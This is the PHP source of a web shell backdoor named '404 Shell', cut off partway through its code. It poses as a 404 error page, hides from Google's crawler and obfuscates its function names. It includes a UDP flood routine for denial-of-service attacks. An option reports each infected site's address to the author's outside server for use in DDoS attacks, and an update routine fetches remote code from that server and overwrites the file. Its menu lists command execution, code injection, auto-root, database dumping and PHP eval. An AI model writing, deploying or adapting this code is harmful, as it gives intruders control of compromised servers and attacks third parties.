<?php
$pass               = md5("pw");
$version            = 3.51;
$adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
$checkforupdates    = true;
$helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
$checkforupdatesurl = "http://mc.kylem.in/404update.php";
$mtime     = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
?><?PHP
if (isset($_SERVER['HTTP_ACCEPT_ENCODING']) && substr_count($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip')) ob_start("ob_gzhandler"); else ob_start();
global $pass, $version, $adaptiveerrorpage, $checkforupdates, $helpsupportbooter, $checkforupdatesurl, $nowpath;
$prg = "\x70\x72\x65\x67\x5f\x72\x65\x70\x6c\x61\x63\x65";
$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
$prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
$prgs = "\x70\x72\x65\x67\x5F\x73\x70\x6C\x69\x74";
$sf = "suhosin_fun\x63_exi\x73ts";
$prco = "pr\x6F\x63\x5Fop\x65n";
$pt = "p\x61\x73\x73th\x72u";
$pen = strrev("of") . 'pen';
$useragent=$_SERVER['HTTP_USER_AGENT'];
$mobile = false;
if($prgm('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i',$useragent)||$prgm('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($useragent,0,4))){
$mobile = true;
}
$prefixme = $prg('@\(.*\(.*$@', '', __FILE__);
error_reporting(0); //Was 7
@set_magic_quotes_runtime(0);
if (get_magic_quotes_gpc()) {
    $process = array(&$_GET, &$_POST, &$_COOKIE, &$_REQUEST);
    while (list($key, $val) = each($process)) {
        foreach ($val as $k => $v) {
            unset($process[$key][$k]);
            if (is_array($v)) {
                $process[$key][stripslashes($k)] = $v;
                $process[] = &$process[$key][stripslashes($k)];
            } else {
                $process[$key][stripslashes($k)] = stripslashes($v);
            }
        }
    }
    unset($process);
}
ob_start();
session_start();
//session_regenerate_id(true);
if($_POST['buttonclick'] == "Go back..." && isset($_SESSION['LASTPOSTDATA'])){
    unset($_POST);
    $_POST = $_SESSION['LASTPOSTDATA'];
}
if(isset($_SESSION['CURRENTPOSTDATA'])) $_SESSION['LASTPOSTDATA'] = $_SESSION['CURRENTPOSTDATA'];
$_SESSION['CURRENTPOSTDATA'] = $_POST;
define('SA_ROOT', str_replace('\\', '/', dirname('__FILE__')) . '/');
define('IS_WIN', stristr($_SERVER['SERVER_SOFTWARE'], 'microsoft')); //DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0);
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo", $dis_func)) ? 1 : 0);
@set_time_limit(0);
if (strpos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
extract($_POST, EXTR_SKIP);
$feather = strrev("rwf") . "ite";
$pixel = strrev("cf") . "lose";
$buy = "f" . strrev("tup") . "s";
$books = "f\x72e" . strrev('da');
$cforupurl = $checkforupdatesurl;
if ($action == 'checkupdates') {
    $parsed = parse_url($cforupurl);
    $query = isset($parsed['query']) ? $parsed['query'] : "";
    $baseurl = rtrim(str_replace($query, "", $cforupurl), "?");
    parse_str($query, $vars);
    if ($force == "true") {
    	if ($helpsupportbooter == false){
    	    $cuuff = $cforupurl;
    	}else{
    	    $add = array("u"=>("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']));
    	    $cuuff = $baseurl . "?" . http_build_query(array_merge($vars, $add));
    	}
    } else {
        $add = array("v"=>$version);
        if($helpsupportbooter != false) $add = array_merge($add, array("u"=>("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])));
        $cuuff = $baseurl . "?" . http_build_query(array_merge($vars, $add));
    }
    $res = file_get_contents($cuuff);
    if (!$res) {
        $res = get_data($cuuff);
    }
    if ($res != "") {
        $ourFileHandle = $pen($prg('@\(.*\(.*$@', '', __FILE__), "w");
        $feather($ourFileHandle,str_replace(strrev("EREHENILUFC"),'$checkforupdates    = '.strbool($checkforupdates).';',str_replace(strrev("EREHENILBSH"),'$helpsupportbooter  = '.strbool($helpsupportbooter).';',str_replace(strrev("EREHENILUUFC"),'$checkforupdatesurl = "'.$checkforupdatesurl.'";',str_replace(strrev("EREHENILPEA"),'$adaptiveerrorpage  = '.strbool($adaptiveerrorpage).';',str_replace(strrev("EREHENILDROWSSAP"),'$pass               = "'.$pass.'";',html_entity_decode($res)))))));
        $pixel($ourFileHandle);
    }
}
if (isset($_REQUEST['host']) && isset($_REQUEST['time'])) {
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    $max_time  = time() + $_REQUEST['time'];
    for ($i = 0; $i < 65000; $i++) {
        $out .= 'X';
    }
    while (1) {
        $packets++;
        if (time() > $max_time) {
            break;
        }
        $rand = "80";
        if (isset($_REQUEST['port']) && $_REQUEST['port'] != "") {
            $rand = $_REQUEST['port'];
        }
        $fp = fsockopen('udp://' . $_REQUEST['host'], $rand, $errno, $errstr, 5);
        if ($fp) {
            $feather($fp, $out);
            $pixel($fp);
        }
    }
}
$cookiepre    = '';
$cookiedomain = '';
$cookiepath   = '/';
$cookielife   = 86400;
!$writabledb && $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
$charsetpagedb = array(
	'big5'			=> 'big5',
	'cp-866'		=> 'cp866',
	'euc-jp'		=> 'ujis',
	'euc-kr'		=> 'euckr',
	'gbk'			=> 'gbk',
	'iso-8859-1'	=> 'latin1',
	'koi8-r'		=> 'koi8r',
	'koi8-u'		=> 'koi8u',
	'utf-8'			=> 'utf8',
	'windows-1252'	=> 'latin1',
);
$charsetdb = array(
    '',
    'armscii8',
    'ascii',
    'big5',
    'binary',
    'cp1250',
    'cp1251',
    'cp1256',
    'cp1257',
    'cp850',
    'cp852',
    'cp866',
    'cp932',
    'dec8',
    'euc-jp',
    'euc-kr',
    'gb2312',
    'gbk',
    'geostd8',
    'greek',
    'hebrew',
    'hp8',
    'keybcs2',
    'koi8r',
    'koi8u',
    'latin1',
    'latin2',
    'latin5',
    'latin7',
    'macce',
    'macroman',
    'sjis',
    'swe7',
    'tis620',
    'ucs2',
    'ujis',
    'utf8'
);
if($charsetpage == '' && $_SESSION[$prefixme.'charsetpage'] == ''){
		$charsetpage = 'utf-8';
}elseif ($charsetpage != ''){
    $_SESSION[$prefixme.'charsetpage'] = $charsetpage;
}elseif ($charsetpage == '' && $_SESSION[$prefixme.'charsetpage'] != ''){
		$charsetpage = $_SESSION[$prefixme.'charsetpage'];
}
if (isset($charsetpagedb[$charsetpage])) {
	header("content-Type: text/html; charset=".$charsetpage);
}
header("X-XSS-Protection: 0");
$self      = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();
if ($action == "logout") {
		unset($_SESSION[$prefixme.'loginpass']);
    unset($_SESSION[$prefixme.'charsetpage']);
    unset($_SESSION[$prefixme.'showupdate']);
    unset($_SESSION[$prefixme.'updateready']);
    session_destroy();
}
if ($pass) {
    if ($action == 'login') {
        if ($pass == md5($password)) {
            $_SESSION[$prefixme.'loginpass'] = md5($password);
            $action = 'file';
        }
    }
    if ($_SESSION[$prefixme.'loginpass']) {
        if ($_SESSION[$prefixme.'loginpass'] != $pass) {
        		unset($_SESSION[$prefixme.'loginpass']);
    				unset($_SESSION[$prefixme.'charsetpage']);
    				unset($_SESSION[$prefixme.'showupdate']);
    				unset($_SESSION[$prefixme.'updateready']);
    				session_destroy();
            loginpage($adaptiveerrorpage);
        }
    } else {
    		unset($_SESSION[$prefixme.'loginpass']);
    		unset($_SESSION[$prefixme.'charsetpage']);
   		 	unset($_SESSION[$prefixme.'showupdate']);
   		 	unset($_SESSION[$prefixme.'updateready']);
   			session_destroy();
        loginpage($adaptiveerrorpage);
    }
}
$errmsg = '';
$uchar = '&#' . '9650;';
$dchar = '&#' . '9660;';
!$action && $action = 'file';
if ($doing == 'downfile' && $thefile) {
    if (!@file_exists($thefile)) {
        $errmsg = 'The file you want to download was nonexistent';
    } else {
        $fileinfo = pathinfo($thefile);
        header('Content-type: application/x-' . $fileinfo['extension']);
        header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
        header('Content-Length: ' . filesize($thefile));
        @readfile($thefile);
        exit;
    }
}
if ($doing == 'downfolder' && $thefile) {
 		if (!@is_dir($thefile)) {
       $errmsg = 'The folder you want to download was nonexistent';
    }else{
    	 $archive_name = $thefile . '.tar';
			 $dir_path = $thefile;
			 $archive = new PharData($archive_name);
			 $archive->buildFromDirectory($dir_path);
			 $archive->compress(Phar::GZ);
			 unlink($archive_name);
			 $thefile2 = $thefile . ".tar.gz";
    	if (!@file_exists($thefile2)) {
     			$errmsg = 'The folder you want to download couldn\'t be compressed';
   		} else {
        	$fileinfo = pathinfo($thefile2);
        	header('Content-type: application/x-' . $fileinfo['extension']);
        	header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
        	header('Content-Length: ' . filesize($thefile2));
        	@readfile($thefile2);
			unlink($thefile2);
			unlink($thefile . ".tar");
      	  exit;
    	}
    }
}
if ($doing == 'backupmysql' && !$saveasfile) {
    if (!$table) {
        $errmsg = 'Please choose the table';
    } else {
        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        $filename  = basename($dbname . '.sql');
        header('Content-type: application/unknown');
        header('Content-Disposition: attachment; filename=' . $filename);
        foreach ($table as $k => $v) {
            if ($v) {
                sqldumptable($v);
            }
        }
        mysql_close();
        exit;
    }
}
if ($doing == 'mysqldown') {
    if (!$dbname) {
        $errmsg = 'Please input dbname';
    } else {
        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        if (!file_exists($mysqldlfile)) {
            $errmsg = 'The file you want Downloadable was nonexistent';
        } else {
            $result = q("select load_file('$mysqldlfile');");
            if (!$result) {
                q("DROP TABLE IF EXISTS tmp_angel;");
                q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
                q("LOAD DATA LOCAL INFILE '" . addslashes($mysqldlfile) . "' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
                $result = q("select content from tmp_angel");
                q("DROP TABLE tmp_angel");
            }
            $row = @mysql_fetch_array($result);
            if (!$row) {
                $errmsg = 'Load file failed ' . mysql_error();
            } else {
                $fileinfo = pathinfo($mysqldlfile);
                header('Content-type: application/x-' . $fileinfo['extension']);
                header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
                header("Accept-Length: " . strlen($row[0]));
                echo $row[0];
                exit;
            }
        }
    }
}
;
echo '<html>
<head>
<link rel="shortcut icon" href="data:image/gif;bas' . 'e64,R0lGODlhEAAQAPAAAAAAAAAAACH5BAkKAAEAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAEAAQAAACMQweqbC6iFxiptrDYp6c+th4kgGBTUU9mSiiHLl2r/Slp+Vg5Hj18O7qtXQ5X64EKAAAIfkECQoAAQAsAAAAABAAEAAAAi8MHJir4JxOhOY9Kk+Odm/0OdKiTZBYjeSkphVrlk0HKyfX2jl63WBM+zWGLoamAAAh+QQJCgABACwAAAAAEAAQAAACMQwcaHCc/ZKM60yFJWv2WqhsS/SRlDiBneagqZm2ZYnQolNT3oO/Osu5nEK8YI4IKAAAIfkECQoAAQAsAAAAABAAEAAAAjAMbhDGreoQYhCuW+dtHEu7Vc5yPKJIkaSmouEHqulrtvJzf3aHrTH3KyU2vVkGUAAAIfkECQoAAQAsAAAAABAAEAAAAi+MD5Z5Ae/YUlQqCJ3ebT/WgCCCjUhFRYtlae3XTRy5mt6sRuj9lrvtyYROMV+jAAAh+QQJCgABACwAAAAAEAAQAAACL0xgeYCMekyDbsmIZ2Y2vkdJXHhR3Ehq3/llV7uAb6lUVYoldgurYsOj1X6QHKIAACH5BAkKAAEALAAAAAAQABAAAAIvTGCpx60AT1yI1QTR1KbylkkduIzShaVUNFGj17EwbJnhQ65aq36Y/LLlQpucqwAAIfkECQoAAQAsAAAAABAAEAAAAjAMEHaJ5p9iRK3JQ5d8dGPFcGHFLFoHXaU1tZ7JumgFj6FDKvG86b5nu9RwN55vUQAAIfkECQoAAQAsAAAAABAAEAAAAjFMYIiXoOtgYtRYq+Y9jq8rfc0zSYwZcaW2QV2LbZ4qh1r6ZpTuiieL6aRgP5DQxigAACH5BAkKAAEALAAAAAAQABAAAAIwjA2RkHe9EGIKUiWh21hvtlyO1jzUFWGdVIUZ+03lQ3/nXKeWu6q6HPOMbjifylAAADs=" />
<meta http-equiv="Content-Type" content="text/html; charset=gbk">
<title>404 Shell - Version ' . $version . '</title>
<style>
.morecontent span {
	display: none;
}
#containertop .rowtop {
  margin: 0;
  padding: 0;
}
#containertop br {
  clear: both;
}
#containertop .blocktop {
  float: left;
}
#containertop .blocksep {
  float: left;
  padding-left:5px;
  padding-right:5px;
}
input[type="button"], input[type="submit"] { 
		moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    border-radius: 5px;
    border-color:#b0b0b0;
    background:#3d3d3d;
    color:#ffffff;
    font:12px Arial,Tahoma;
    height:22px;
}
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.red{color:#f00;}
.black{color:#000;}
.green{color:#090;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px \'Courier New\', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
.infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.drives{padding:5px;}
.drives span {margin:auto 7px;}
</style>
<script type="text/javascript">
function $id(id){
    return document.getElementById(id);
}
function Init() {
    var filedrag = $id("thefilelist");
    if(filedrag){
        filedrag.addEventListener("dragover", FileDragHover, false);
    	filedrag.addEventListener("dragleave", FileDragHover, false);
    	filedrag.addEventListener("drop", FileSelectHandler, false);
	}
}
String.prototype.toDOM=function(){
  var d=document
     ,i
     ,a=d.createElement("div")
     ,b=d.createDocumentFragment();
  a.innerHTML=this;
  while(i=a.firstChild)b.appendChild(i);
  return b;
};
function FileDragHover(e) {
    if(e.target.type != "file"){
    	e.stopPropagation();
    	e.preventDefault();
    	e.target.className = (e.type == "dragover" ? "hover" : "");
	}
}
function FileSelectHandler(e) {
    if(e.target.type != "file"){
    	FileDragHover(e);
    	var files = e.target.files || e.dataTransfer.files;
    	UploadFiles(files);
	}
}
window.onbeforeunload = function(){
    return \'Are you sure you want to leave?\';
};
function orsc(){
    if (document.readyState == "complete") {
         var showChar = 100;
         var classes = document.getElementsByClassName(\'more\');
         for (var i = 0; i < classes.length; ++i) {
             var item = classes[i];
             var content = item.innerHTML;
             if (content.length > showChar) {
                 var c = content.substr(0, showChar);
                 var h = content.substr(showChar, content.length - showChar);

                 var html = c + \'<span class="moreelipses">...</span><span class="morecontent"><span>\' + h + \'</span>  <a href="javascript:void(0)" class="morelink">See more</a></span>\';
                 item.innerHTML = html;
             }
         }
         var buts = document.getElementsByClassName(\'morelink\');
         for (var j = 0; j < buts.length; ++j) {
             buts[j].addEventListener("click", function() {
                 if (this.classList.contains("less")) {
                     this.classList.remove("less");
                     this.innerHTML = "See more";
                 } else {
                     this.classList.add("less");
                     this.innerHTML = "See less";
                 }
                 if (this.parentNode.children[0].style.display == "inline") {
                     this.parentNode.children[0].style.display = "none";
                 } else {
                     this.parentNode.children[0].style.display = "inline";
                 }
                 if (this.parentNode.parentNode.children[0].style.display == "none") {
                     this.parentNode.parentNode.children[0].style.display = "inline";
                 } else {
                     this.parentNode.parentNode.children[0].style.display = "none";
                 }
                 return false;
             });
         }
     }
     if (window.File && window.FileList && window.FileReader) {
	    Init();
     }
}
 document.onreadystatechange = function() {
     orsc();
 }
function CheckAll(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != \'chkall\')
		e.checked = form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
}
function createdir(){
	var newdirname;
	newdirname = prompt(\'Please input the directory name:\', \'\');
	if (!newdirname) return;
	$(\'createdir\').newdirname.value=newdirname;
	window.onbeforeunload = null;
	$(\'createdir\').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt(\'Current file:\'+pfile+\'\\nPlease input new attribute:\', \'\');
	if (!newperm) return;
	$(\'fileperm\').newperm.value=newperm;
	$(\'fileperm\').pfile.value=pfile;
	window.onbeforeunload = null;
	$(\'fileperm\').submit();
}
function setsort(k) {
	$(\'gooddbform\').order.value=k;
	window.onbeforeunload = null;
	$(\'gooddbform\').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt(\'Original file:\'+sname+\'\\nPlease input object file (fullpath):\', \'\');
	if (!tofile) return;
	$(\'copyfile\').tofile.value=tofile;
	$(\'copyfile\').sname.value=sname;
	window.onbeforeunload = null;
	$(\'copyfile\').submit();
}
function unzipfile(unzipfile){
	$(\'unzipfile\').unzipfile.value=unzipfile;
	window.onbeforeunload = null;
	$(\'unzipfile\').submit();
}
function ungzfile(ungzfile){
	$(\'ungzfile\').ungzfile.value=ungzfile;
	window.onbeforeunload = null;
	$(\'ungzfile\').submit();
}
function untarfile(untarfile){
	$(\'untarfile\').untarfile.value=untarfile;
	window.onbeforeunload = null;
	$(\'untarfile\').submit();
}
function copyfolder(srcdir){
	var tofolder;
	tofolder = prompt(\'Original folder:\'+srcdir+\'\\nPlease input object folder (fullpath):\', \'\');
	if (!tofolder) return;
	$(\'copyfolder\').tofolder.value=tofolder;
	$(\'copyfolder\').srcdir.value=srcdir;
	window.onbeforeunload = null;
	$(\'copyfolder\').submit();
}
function rename(oldname){
	var newfilename;
	var oldfname = oldname.substring(oldname.lastIndexOf(\'/\')+1)
	newfilename = prompt(\'Former file name: \'+oldname+\'\\nPlease input new filename:\', oldfname);
	if (!newfilename) return;
	$(\'rename\').newfilename.value=newfilename;
	$(\'rename\').oldname.value=oldname;
	window.onbeforeunload = null;
	$(\'rename\').submit();
}
function dofile(doing,thefile,m){
	if (m && !confirm(m)) {
		return;
	}
	$(\'filelist\').doing.value=doing;
	if (thefile){
		$(\'filelist\').thefile.value=thefile;
	}
	window.onbeforeunload = null;
	$(\'filelist\').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt(\'Please input the file name:\', \'\');
	if (!filename) return;
	opfile(\'editfile\',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
	$(\'fileopform\').action.value=action;
	$(\'fileopform\').opfile.value=opfile;
	$(\'fileopform\').dir.value=dir;
	window.onbeforeunload = null;
	$(\'fileopform\').submit();
}
function killproc(pid){
	$(\'killprocform\').action.value=\'process\';
	$(\'killprocform\').pid.value=pid;
	$(\'killprocform\').doing.value=\'killproc\';
	window.onbeforeunload = null;
	$(\'killprocform\').submit();
}
function killprocm(){
	$(\'proclist\').action.value=\'process\';
	$(\'proclist\').doing.value=\'killproc\';
	window.onbeforeunload = null;
	$(\'proclist\').submit();
}
function godir(dir,view_writable){
	if (view_writable) {
		$(\'godir\').view_writable.value=view_writable;
	}
	$(\'godir\').dir.value=dir;
	window.onbeforeunload = null;
	$(\'godir\').submit();
}
function getsize(getdir,dir){
	$(\'getsize\').getdir.value=getdir;
	$(\'getsize\').dir.value=dir;
	window.onbeforeunload = null;
	$(\'getsize\').submit();
}
function editrecord(action, base64, tablename){
	if (action == \'del\') {		
		if (!confirm(\'Is or isn\\\'t deletion record?\')) return;
	}
	$(\'recordlist\').doing.value=action;
	$(\'recordlist\').base64.value=base64;
	$(\'recordlist\').tablename.value=tablename;
	window.onbeforeunload = null;
	$(\'recordlist\').submit();
}
function moddbname(dbname) {
	if(!dbname) return;
	$(\'gooddbform\').dbname.value=dbname;
	window.onbeforeunload = null;
	$(\'gooddbform\').submit();
}
function settable(tablename,doing,page) {
	if(!tablename) return;
	if (doing) {
		$(\'gooddbform\').doing.value=doing;
	}
	if (page) {
		$(\'gooddbform\').page.value=page;
	}
	$(\'gooddbform\').tablename.value=tablename;
	window.onbeforeunload = null;
	$(\'gooddbform\').submit();
}
function sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb,subdirs) {
	if(action != null) $(\'opform\').action.value=action;
	if(nowpath != null) $(\'opform\').nowpath.value=nowpath;
	if(p1 != null) $(\'opform\').p1.value=p1;
	if(p2 != null) $(\'opform\').p2.value=p2;
	if(p3 != null) $(\'opform\').p3.value=p3;
	if(p4 != null) $(\'opform\').p4.value=p4;
	if(p5 != null) $(\'opform\').p5.value=p5;
	if(charsetpage != null) $(\'opform\').charsetpage.value=charsetpage;
	if(dir != null) $(\'opform\').dir.value=dir;
	if(findstr != null) $(\'opform\').findstr.value=findstr;
	if(findin != null) $(\'opform\').findin.value=findin;
	if(re != null) $(\'opform\').re.value=re;
	if(writabledb != null) $(\'opform\').writabledb.value=writabledb;
	if(subdirs != null) $(\'opform\').subdirs.value=subdirs;
}
function g(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb,subdirs) {
	if(!action) return;
	sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb,subdirs);
	window.onbeforeunload = null;
	$(\'opform\').submit();
}
</script>
</head>
<body style="margin:0;table-layout:fixed; word-break:break-all">
';
formhead(array(
    'name' => 'opform'
));
makehide('action', $action);
makehide('nowpath', $nowpath);
makehide('p1', $p1);
makehide('p2', $p2);
makehide('p3', $p3);
makehide('p4', $p4);
makehide('p5', $p5);
makehide('charsetpage', $charsetpage);
makehide('dir', $dir);
makehide('findstr', '');
makehide('findin', '');
makehide('re', '');
makehide('writabledb', '');
makehide('subdirs','');
formfoot();
if (!$dir) {
    $dir = $_SERVER["DOCUMENT_ROOT"] ? $_SERVER["DOCUMENT_ROOT"] : '.';
}
$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
    $dir = $dir . '/';
}
p('<form id="filelist" name="filelist" onSubmit="window.onbeforeunload = null;" action="' . $self . '" method="post">');
makehide('action', 'file');
makehide('thefile');
makehide('doing');
makehide('dir', $nowpath);
if (!$sf("\x70\x6f\x73\x69\x78\x5f\x67\x65\x74\x65\x67\x69\x64")) {//placemarkerhere
    $user  = @get_current_user();
    $uid   = @getmyuid();
    $gid   = @getmygid();
    $group = "?";
} else {
    $uid   = @posix_getpwuid(@posix_geteuid());
    $gid   = @posix_getgrgid(@posix_getegid());
    $user  = $uid['name'];
    $uid   = $uid['uid'];
    $group = $gid['name'];
    $gid   = $gid['gid'];
}
;
echo '<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;">';
echo @php_uname();
;
echo ' / User: ';
echo $uid . ' ( ' . $user . ' ) / Group: ' . $gid . ' ( ' . $group . ' )';
;
echo '</span>';
echo $_SERVER['HTTP_HOST'];
;
echo ' (';
if (gethostbyname($_SERVER['SERVER_NAME']) == "127.0.0.1") {
    echo $_SERVER["SERVER_ADDR"];
} else {
    echo gethostbyname($_SERVER['SERVER_NAME']);
}
;
echo ')</td>
	</tr>
	<tr class="alt1">
		<td>
			<div id="containertop"><span style="float:right;">PHP ';
echo PHP_VERSION;
;
echo ' / Safe Mode: ';
echo getcfg("s\x61f\x65_mo\x64e");
;
echo '</span>
			<div class="rowtop">
			<div class="blocktop"><a href="javascript:g(\'file\', \'' . str_replace("'", "\'", $_SERVER["DOCUMENT_ROOT"]) . '\', null, null, null, null, null, null, \'' . str_replace("'", "\'", $_SERVER["DOCUMENT_ROOT"]) . '\');">File Manager</a></div><div class="blocksep">|</div>';
			if (!IS_WIN){
			echo '<div class="blocktop"><a href="javascript:g(\'process\');">Process Manager</a></div><div class="blocksep">|</div>';
			}
			echo '<div class="blocktop"><a href="javascript:g(\'mysqladmin\');">MySQL Manager</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'sqlfile\');">MySQL Upload & Download</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'cinj\');">Code Injector</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'cej\');">Code Ejector</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'fuzz\');">Fuzz Server</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'dos\');">DDoS</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'shell\');">' . "\x45\x78\x65\x63" . 'ute Command</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'phpenv\');">PHP Variable</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'portscan\');">Port Scan</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'stringtools\');">String Tools</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'email\');">Email</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'secinfo\');">Security Information</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'aroot\');">Auto Root</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'pob\');">PHP Obfuscator</a></div><div class="blocksep">|</div>
			<div class="blocktop"><a href="javascript:g(\'laev\');">' . "\x45\x76\x61\x6C" . 'uate PHP Code</a></div><div class="blocksep">|</div>
			';
if (!IS_WIN) {
    ;
